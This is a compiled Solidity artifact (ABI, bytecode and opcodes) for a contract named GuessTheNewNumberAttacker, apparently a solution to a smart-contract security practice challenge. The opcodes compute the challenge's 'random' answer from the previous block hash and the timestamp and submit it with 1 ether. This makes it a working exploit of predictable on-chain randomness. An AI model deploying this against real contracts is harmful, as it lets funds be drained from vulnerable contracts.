{"contracts/GuessTheNewNumberChallenge.sol":{"GuessTheNewNumberAttacker":{"abi":[{"constant":false,"inputs":[{"name":"challengeAddress","type":"address"}],"name":"attack","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"payable":true,"stateMutability":"payable","type":"fallback"}],"evm":{"bytecode":{"linkReferences":{},"object":"6060604052341561000f57600080fd5b6101768061001e6000396000f300606060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063d018db3e14610043575b005b61006f600480803573ffffffffffffffffffffffffffffffffffffffff16906020019091905050610071565b005b6000670de0b6b3a76400003414151561008957600080fd5b6001430340426040518083600019166000191681526020018281526020019250505060405180910390206001900490508173ffffffffffffffffffffffffffffffffffffffff16634ba4c16b670de0b6b3a7640000836040518363ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401808260ff1660ff1681526020019150506000604051808303818588803b151561013557600080fd5b5af1151561014257600080fd5b5050505050505600a165627a7a72305820a15e01fe736048ceb1e9e1e28e4225b83154fdba2001688d5cd2120a840d32210029","opcodes":"PUSH1 0x60 PUSH1 0x40 MSTORE CALLVALUE ISZERO PUSH2 0xF JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x176 DUP1 PUSH2 0x1E PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN STOP PUSH1 0x60 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x41 JUMPI PUSH1 0x0 CALLDATALOAD PUSH29 0x100000000000000000000000000000000000000000000000000000000 SWAP1 DIV PUSH4 0xFFFFFFFF AND DUP1 PUSH4 0xD018DB3E EQ PUSH2 0x43 JUMPI JUMPDEST STOP JUMPDEST PUSH2 0x6F PUSH1 0x4 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP2 SWAP1 POP POP PUSH2 0x71 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH8 0xDE0B6B3A7640000 CALLVALUE EQ ISZERO ISZERO PUSH2 0x89 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 NUMBER SUB BLOCKHASH TIMESTAMP PUSH1 0x40 MLOAD DUP1 DUP4 PUSH1 0x0 NOT AND PUSH1 0x0 NOT AND DUP2 MSTORE PUSH1 0x20 ADD DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP3 POP POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 KECCAK256 PUSH1 0x1 SWAP1 DIV SWAP1 POP DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4BA4C16B PUSH8 0xDE0B6B3A7640000 DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH29 0x100000000000000000000000000000000000000000000000000000000 MUL DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP3 PUSH1 0xFF AND PUSH1 0xFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO ISZERO PUSH2 0x135 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST GAS CALL ISZERO ISZERO PUSH2 0x142 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP POP POP POP POP POP JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 LOG1 0x5e ADD INVALID PUSH20 0x6048CEB1E9E1E28E4225B83154FDBA2001688D5C 0xd2 SLT EXP DUP5 0xd ORIGIN 0x21 STOP 0x29 "},"methodIdentifiers":{"attack(address)":"d018db3e"}}}}}